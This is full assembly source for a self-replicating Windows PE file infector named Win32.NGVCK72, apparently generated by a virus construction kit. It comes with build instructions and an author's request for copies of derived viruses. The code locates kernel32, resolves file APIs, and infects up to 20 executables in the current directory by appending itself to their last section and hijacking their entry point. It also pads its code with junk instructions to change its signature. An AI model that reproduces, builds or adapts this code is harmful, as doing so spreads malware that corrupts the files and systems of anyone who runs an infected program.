              
;
;
; Win32.NGVCK72 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK72
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 47
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
                                        ; mov ebp, edx
                                        ; clear ebp
 and ebp, 0
 add ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov edi, edx
                                        ; clear edi
 sub edi, edi
 add edi, edx
 push ebx
 push edi
 push ecx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [ecx]
 cmp dl, byte ptr [edi]
 jne ApiNotFound
 dec ebx
 or ebx, ebx
 jz FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add ecx, 1
 sub ecx, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ecx
 pop edi
 pop ebx
 pop eax
                                        ; add eax, 4
 add eax, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 16d
                                        ; retrieve the offset
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edx
                                        ; clear eax
 mov eax, -46610d
 add eax, 46610d
 mov ax, word ptr [edx]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 OTableVA    dd 0h
 FindHandle  dd 0h
 NewEIP      dd 0h
 ATableVA    dd 0h
 AlignTemp   dd 0h
 NewSize     dd 0h
 Attributes  dd 0h
 AlignReg1   dd 0h
 OldBase     dd 400000h
 AlignReg2   dd 0h

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h

 K32Trys     dd 0h

 APINames:
 db 18d, 'CreateFileMappingA'
 db 11d, 'CloseHandle'
 db 18d, 'GetFileAttributesA'
 db 13d, 'MapViewOfFile'
 db 09d, 'FindClose'
 db 11d, 'CreateFileA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'SetFileAttributesA'
 db 14d, 'FindFirstFileA'
 db 13d, 'FindNextFileA'

 MapAddress  dd 0h
 KernelPE    dd 0h
 OldEIP      dd 0h
 NTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 filemask    db '*.eXE',0
 FileHandle  dd 0h
 TempAPI     dd 0h
 Trash2      dd 0h
 MapHandle   dd 0h
 Trash1      dd 0h
 InfCounter  dd 0h
 counter     dw 0h
 KernelMZ    dd 0h
 db 'Win32.NGVCK72 of SnakeByte',0




;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xor dword ptr [ebp+Trash1], edx        ; Trash
 xchg ebx, ecx

 push ebx
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ecx
 add dword ptr [ebp+Trash1], edx        ; Trash

                                        ; mov ebx, 276
 mov ebx, 276d

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 inc ecx
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ebx

 mov dword ptr [ebp+retEIP], ebx

 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 push 0
 pop edx
 add edx, NumberOfApis
                                        ; clear eax
 mov eax, -26462d
 add eax, 26462d
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
                                        ; get ATableVA
 mov eax, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [edi]
                                        ; add edi, 4
 inc edi
 add edi, 3d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; load API Names and Offsets
 lea ebx, [ebp+APIOffsets]
 xchg ebx, edi

 mov ecx, ebp
 add ecx, offset APINames


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [ecx]
                                        ; add ecx, 1
 inc ecx

                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; ecx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add ecx, ebx
                                        ; clear esi
 and esi, 0
 xor esi, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], esi
                                        ; add edi, 4
 dec edi
 add eax, 48303364d                     ; Trash
 add edi, 5d
 sub edx, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, eax
 add ecx, [eax+3Ch]
                                        ; get File Alignment
                                        ; add ecx, 60
 add ecx, 60d
 mov ebx, [ecx]
                                        ; mov edx, 60
 mov edx, ( 60d + 29d )
 sub edx, 29d
 sub ecx, edx
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 add ebx, -1
 imul ebx, ebx, 28h
 add edx, ebx
                                        ; add edx, 120
 add edx, 120d
 mov eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov ecx, [edx+10h]
                                        ; mov ebx, ecx
 push ecx
 pop ebx
 add edx, 14h
 add ecx, [edx]
 sub edx, 14h
 push ecx
 mov eax, ebx
 add eax, [edx+0Ch]
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
                                        ; clear eax
 push 0
 pop eax

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+10h]
 add eax, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg eax, esi

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+InfCounter]
 add ecx, -1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, -41077d
 add edx, 41077d
 mov ecx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ebx

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov edx, ebp
 add edx, offset WFD_szFileName


 dec ebx                                ; Trash
 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov edx, 28501
 mov edx, 28501d
 cmp edx, 28501d
 je Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ebx, 33189
 mov ebx, ( 33189d xor 14d )
 xor ebx, 14d
 cmp ebx, 33189d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov ecx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ebx
 mov ebx, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ebx]
 lea ebx, [ebp+GetKernel32Exception]

 push ebx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 6h
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edi

                                        ; mov edi, -1
 mov edi, ( -1d xor 29d )
 xor edi, 29d
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi



GK1:                                    ; check for DOS-EXE Stub
 mov edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jnz GotKernelXX
 jmp GetKernel32NotFound
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 add ecx, -65536d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [ecx+3Ch]
 neg ecx
 sub edx, ecx
 neg ecx
                                        ; check for EP
 movzx eax, word ptr [edx]
 sub eax, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 add edx, 22d
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [edx]
 and ax, 0F000h
 cmp ax, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
                                        ; mov ebx, 22
 mov ebx, ( 22d - 18d )
 add ebx, 18d
 sub edx, ebx


KernelFound:
 push edx
 pop dword ptr [ebp+KernelPE]
 push ecx
 pop dword ptr [ebp+KernelMZ]

                                        ; clear ecx
 mov ecx, 57460d
 sub ecx, 57460d

 pop dword ptr fs:[ecx]
 pop eax
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 mov eax, 1900d
 sub eax, 1900d

 mov ebx, dword ptr fs:[eax]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear edx
 push 0
 pop edx

 pop dword ptr fs:[edx]
 pop eax
 popad
 stc
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edi

 push edi
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 mov ecx, -17593d
 add ecx, 17593d
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 push ecx
 push ebx
 push ecx
 sal edx, 5d                            ; Trash
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
                                        ; clear edx
 mov edx, 0
 push ebx
 push edx
 push edx
                                        ; mov eax, 2
 mov eax, ( 2d + 36d )
 sub eax, 36d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 inc ecx                                ; Trash
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

